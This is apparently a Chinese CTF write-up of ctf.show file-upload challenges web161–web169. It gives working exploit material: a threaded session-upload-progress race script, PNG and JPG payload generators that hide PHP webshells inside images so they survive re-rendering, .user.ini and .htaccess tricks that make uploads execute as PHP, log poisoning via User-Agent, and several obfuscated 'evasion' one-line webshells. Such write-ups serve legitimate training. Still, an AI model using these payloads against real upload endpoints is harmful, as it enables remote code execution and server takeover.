<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?&#x3D;include&quot;ph&quot;.&quot;p:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;flag.ph&quot;.&quot;p&quot;?&gt;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723162541778.png" alt="image-20210723162541778"></p>
<h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><blockquote>
<ul>
<li>连普通的图片的上传上去，查了下</li>
<li><strong>getimagesize():</strong> 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</li>
<li>所以在上题的基础上都加个<strong>GIF89a</strong>图片头就可以了</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723163145783.png" alt="image-20210723163145783"></p>
<h2 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h2><blockquote>
<ul>
<li><strong>session文件包含原理，和web82相同，还是先上传.user.ini，过gif图片头加一个GIF89A</strong></li>
<li>参考 <a href="http://www.xl-bit.cn/index.php/archives/90/" target="_blank" rel="noopener">bit</a>、<a href="https://blog.csdn.net/miuzzx/article/details/109537262" target="_blank" rel="noopener">yu22x</a>、<a href="https://www.wlhhlc.top/posts/14827/#web162" target="_blank" rel="noopener">dota_st</a></li>
</ul>
</blockquote>
<ul>
<li><strong>.user.ini</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">GIF89A</span><br><span class="line">auto_prepend_file&#x3D;&#x2F;tmp&#x2F;sess_test</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>exp162.py</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessID = <span class="string">'test'</span></span><br><span class="line">url = <span class="string">'http://b309cf39-67ef-4ccd-8a93-9c7371becec8.chall.ctf.show/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(session)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b'a'</span> * <span class="number">256</span> * <span class="number">1</span>)</span><br><span class="line">        response = session.post(</span><br><span class="line">            url,</span><br><span class="line">            cookies=&#123;<span class="string">'PHPSESSID'</span>: sessID&#125;,</span><br><span class="line">            data=&#123;<span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: <span class="string">'&lt;?php system("nl ../*.php");?&gt;'</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">'file'</span>: (<span class="string">'test.txt'</span>, f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(session)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        response = session.get(url + <span class="string">'upload/index.php'</span>.format(sessID))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[*]retrying...'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.set()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>运行结果</strong></li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724104738490.png" alt="image-20210724104738490"></p>
<h2 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h2><blockquote>
<ul>
<li>和上题一模一样</li>
</ul>
</blockquote>
<h2 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h2><blockquote>
<ul>
<li>题目说改头换面，猜测可能是二次渲染，大家可以参考<a href="https://www.sqlsec.com/2020/10/upload.html#toc-heading-21" target="_blank" rel="noopener">国光师傅</a></li>
<li>直接用外国大佬脚本生成一个</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*&lt;?$_GET[0]($_POST[1]);?&gt;*/</span></span><br><span class="line"></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">    <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">    $r = $p[$y];</span><br><span class="line">    $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">    $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">    $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">    imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">'1.png'</span>);</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724105501375.png" alt="image-20210724105501375"></p>
<ul>
<li><strong>打开看看是否成功写入</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$_GET[<span class="number">0</span>]($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724105536362.png" alt="image-20210724105536362"></p>
<blockquote>
<ul>
<li><strong>直接上传，抓包，改post传参然后getflag</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724105922637.png" alt="image-20210724105922637"></p>
<h2 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h2><blockquote>
<ul>
<li><strong>这次变成jpg二次渲染，网上找大佬代码</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">	It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">	2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">	jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">	1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">	2) The jpg_payload.php script outputs "Something's wrong".</span></span><br><span class="line"><span class="comment">	If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	See also:</span></span><br><span class="line"><span class="comment">	https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	$miniPayload = <span class="string">'&lt;?=eval($_POST[1]);?&gt;'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!extension_loaded(<span class="string">'gd'</span>) || !function_exists(<span class="string">'imagecreatefromjpeg'</span>)) &#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">'php-gd is not installed'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	set_error_handler(<span class="string">"custom_error_handler"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">		$nullbytePayloadSize = $pad;</span><br><span class="line">		$dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">		$outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">		$extraBytes = <span class="number">0</span>;</span><br><span class="line">		$correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Incorrect SOI marker'</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">			$marker = $dis-&gt;readByte();</span><br><span class="line">			$size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">			$dis-&gt;skip($size);</span><br><span class="line">			<span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">				$startPos = $dis-&gt;seek();</span><br><span class="line">				$outStreamTmp = </span><br><span class="line">					substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">					$miniPayload . </span><br><span class="line">					str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize) . </span><br><span class="line">					substr($outStream, $startPos);</span><br><span class="line">				checkImage(<span class="string">'_'</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="keyword">TRUE</span>);</span><br><span class="line">				<span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">						<span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">							<span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">								<span class="keyword">break</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					$stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">					$imageStreamSize = $stopPos - $startPos;</span><br><span class="line">					$outStream = </span><br><span class="line">						substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">						$miniPayload . </span><br><span class="line">						substr(</span><br><span class="line">							str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize).</span><br><span class="line">								substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">							<span class="number">0</span>,</span><br><span class="line">							$nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">								substr($outStream, $stopPos);</span><br><span class="line">				&#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">					$outStream = $outStreamTmp;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(checkImage(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">'Success!'</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	unlink(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'Something\'s wrong'</span>);</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">checkImage</span><span class="params">($filename, $data, $unlink = FALSE)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $correctImage;</span><br><span class="line">		file_put_contents($filename, $data);</span><br><span class="line">		$correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line">		imagecreatefromjpeg($filename);</span><br><span class="line">		<span class="keyword">if</span>($unlink)</span><br><span class="line">			unlink($filename);</span><br><span class="line">		<span class="keyword">return</span> $correctImage;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span><span class="params">($errno, $errstr, $errfile, $errline)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">		$correctImage = <span class="keyword">FALSE</span>;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/(\d+) extraneous bytes before marker/'</span>, $errstr, $m)) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">				$extraBytes = (int)$m[<span class="number">1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> $binData;</span><br><span class="line">		<span class="keyword">private</span> $order;</span><br><span class="line">		<span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $order = false, $fromString = false)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = <span class="string">''</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">			<span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">				<span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">'File not exists ['</span>.$filename.<span class="string">']'</span>);</span><br><span class="line">				<span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span><span class="params">($skip)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			$byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">return</span> ord($byte);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			$short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">				$short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				$short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> $short;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>上传一个jpg图片，因为有些图片的成功率不太高，就直接用可以成功的图片，找了个国光老师的图片，原图</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/jpg%E6%B8%B2%E6%9F%93.jpg" alt="jpg渲染"></p>
<blockquote>
<ul>
<li><strong>先上传这个图片，让这个图片被渲染，然后下载下来，格式改jgp</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724112625357.png" alt="image-20210724112625357"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724112815685.png" alt="image-20210724112815685"></p>
<blockquote>
<ul>
<li>上传，抓包记得我们写的一句话是</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724112904880.png" alt="image-20210724112904880"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724113008986.png" alt="image-20210724113008986"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724113107225.png" alt="image-20210724113107225"></p>
<h2 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h2><blockquote>
<ul>
<li><strong>查看源码发现只能穿zip</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724140634097.png" alt="image-20210724140634097"></p>
<blockquote>
<ul>
<li><strong>抓包，直接给zip上传一句话木马；</strong></li>
<li>注意：<strong>Content-Type为application/x-zip-compressed</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724142043177.png" alt="image-20210724142043177"></p>
<blockquote>
<ul>
<li><strong>抓刚刚传进去的文件，根据zip文件上传的文件包含的特性直接命令执行</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724142204934.png" alt="image-20210724142204934"></p>
<h2 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h2><blockquote>
<ul>
<li>根据提示说httpd,想到是<strong>.htaccess</strong>,应该是要利用.htaccess进行绕过</li>
<li><strong>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</strong></li>
</ul>
</blockquote>
<ul>
<li><strong>方法一</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg &#x2F;&#x2F;将.jpg后缀解析成php执行</span><br></pre></td></tr></table></figure></div>

<ul>
<li>方法二</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>两个方法一个意思两种写法，这里用方法一，上传.htaccess</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724143059388.png" alt="image-20210724143059388"></p>
<blockquote>
<ul>
<li><strong>在上传一个1.jpg的一句话木马</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724143222669.png" alt="image-20210724143222669"></p>
<blockquote>
<ul>
<li>直接打开1.jpg的图片拿flag</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724143341786.png" alt="image-20210724143341786"></p>
<h2 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h2><blockquote>
<ul>
<li>提示说基础免杀，这里提供几个基础的免杀脚本</li>
</ul>
</blockquote>
<ul>
<li><strong>前三个免杀 密码 0</strong>  <strong>最后一个自己构造</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"s#y#s#t#e#m"</span>;</span><br><span class="line">$b = explode(<span class="string">"#"</span>,$a);</span><br><span class="line">$c = $b[<span class="number">0</span>].$b[<span class="number">1</span>].$b[<span class="number">2</span>].$b[<span class="number">3</span>].$b[<span class="number">4</span>].$b[<span class="number">5</span>];</span><br><span class="line">$c($_REQUEST[<span class="number">0</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=substr(<span class="string">'1s'</span>,<span class="number">1</span>).<span class="string">'ystem'</span>;  </span><br><span class="line">$a($_REQUEST[<span class="number">0</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=strrev(<span class="string">'metsys'</span>); <span class="comment">//反转</span></span><br><span class="line">$a($_REQUEST[<span class="number">0</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=$_REQUEST[<span class="string">'a'</span>];</span><br><span class="line">$b=$_REQUEST[<span class="string">'b'</span>];</span><br><span class="line">$a($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>抓包上传</li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724145000996.png" alt="image-20210724145000996"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724145218511.png" alt="image-20210724145218511"></p>
<h2 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h2><blockquote>
<ul>
<li><strong>右键源码查看前端限制只能上传zip，先上传一个zip，然后抓包，改<code>Content-Type</code>为<code>image/png</code>，可以传php等格式，但发现内容中过滤了<code>&lt;&gt;</code>和<code>php</code>，试了下可以传<code>.user.ini</code>，我们尝试一下日志包含，<code>User-Agent</code>加上一句话木马</strong></li>
</ul>
</blockquote>
<ul>
<li><strong>.user.ini</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>1.php</strong></li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724145745539.png" alt="image-20210724145745539"></p>
<ul>
<li><strong>访问1.php发现成功包含</strong></li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724145854727.png" alt="image-20210724145854727"></p>
<ul>
<li><p><strong>随便访问一个页面写一个User-Agent</strong></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724150029046.png" alt="image-20210724150029046"></p>
</li>
<li><p><strong>测试phpinfo();</strong></p>
</li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724150124088.png" alt="image-20210724150124088"></p>
<ul>
<li><strong>直接连webshell找flag或者直接命令执行</strong></li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210724150419763.png" alt="image-20210724150419763"></p>
